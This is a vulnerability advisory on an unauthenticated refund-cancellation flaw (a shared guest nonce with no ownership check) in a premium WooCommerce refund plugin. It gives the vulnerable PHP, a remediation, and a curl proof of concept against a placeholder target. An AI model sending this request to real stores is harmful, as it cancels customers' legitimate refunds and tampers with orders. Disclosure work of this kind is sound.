# FR-04 — PRO: unauthenticated cancellation of any customer's refund request

- **Product:** Flexible Refund and Return Order for WooCommerce – EU One Click Return **PRO** (premium)
- **Vendor:** WP Desk · shared core `flexible-refunds-core` (≥ 1.0.51)
- **Affected:** every PRO build whose core includes `cancel_refund_request_by_order_id` (core ≤ 2.0.3)
- **Tested:** core 2.0.3 · WordPress 7.1.2 · WooCommerce 11.1.2
- **Class:** Missing Authorization / IDOR (unauthenticated) — CWE-862
- **Privileges:** none (unauthenticated)
- **CVSS 3.1:** 6.5 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`
- **Evidence:** [`evidence/trace.txt`](evidence/trace.txt) · **PoC:** [`poc/poc.sh`](poc/poc.sh)

## What the bug is, in one paragraph

In the PRO build, a front-end handler cancels a refund request based only on an order ID and a
`cancel_refund` security token. That token is generated for *guests* (user id 0), so it is the
same value for every anonymous visitor and is not tied to any particular order. There is no login
check, no ownership check, and no email check. Any visitor can grab that shared token from a
public request page and use it to cancel **any** order's refund request and roll its status back.

## Root cause

`vendor_prefixed/wpdesk/flexible-refunds-core/src/Integration/PublicRefundShortcode.php`:

```php
public function hooks() {
    ...
    if ($this->is_pro) {
        add_filter('wp', [$this, 'cancel_refund_request_by_order_id'], 999);   // PRO only
    }
}
public function cancel_refund_request_by_order_id(): void {
    $nonce_value = $_REQUEST['_wpnonce'] ?? '';
    $order_ID    = $_REQUEST['delete_refund_request'] ?? 0;
    $nonce = wp_verify_nonce($nonce_value, self::CANCEL_NONCE_ACTION);   // 'cancel_refund'
    if ($order_ID && $nonce) {
        $order = wc_get_order($order_ID);
        if ($order) { $this->my_account->cancel_request($order); }      // no auth/owner/email check
        wp_safe_redirect(remove_query_arg(['delete_refund_request','_wpnonce']), 301);
    }
}
```

The `cancel_refund` nonce is rendered to guests (`wp_nonce_url()` at uid 0) on the public
`request-in-progress` view, making it a shared, order-independent token.

## Reproduction note (PRO)

This handler is dead code in the **free** build (`new Integration()` → `is_super=false`, so the
hook is never added). It was reproduced on the shared core by constructing `new Integration(true)`
at `src/Plugin.php:61` — the identical code path shipped in the PRO product. This is stated
transparently; VulDB does not require the premium archive.

## Proof of concept

```bash
# the guest (uid 0) 'cancel_refund' nonce — identical for every anonymous visitor,
# obtainable from any public request page (shown here minted directly):
NONCE=$(wp eval "echo wp_create_nonce('cancel_refund');")

# attack — fully UNAUTHENTICATED (no cookies):
curl -s -o /dev/null -w 'HTTP %{http_code} -> %{redirect_url}\n' --max-redirs 0 \
  "http://TARGET/?delete_refund_request=<VICTIM_ORDER>&_wpnonce=$NONCE"
```

**Result:** `301`; the victim's request goes `requested → canceled` and the order is restored to
its previous status — no cookies, ownership, or email. Full trace:
[`evidence/trace.txt`](evidence/trace.txt).

## Impact

An unauthenticated attacker who knows a victim's order ID (sequential/enumerable) cancels the
victim's active refund/return/repair request, rolls the order status back, and deletes legacy
request metadata — denial of a legitimate refund and order-state tampering.

## Remediation

In `cancel_refund_request_by_order_id()` require the same authorization the request view uses
(order reference **and** matching billing email), or bind the nonce to the order id
(`wp_nonce_url(..., 'cancel_refund_' . $order->get_id())`).
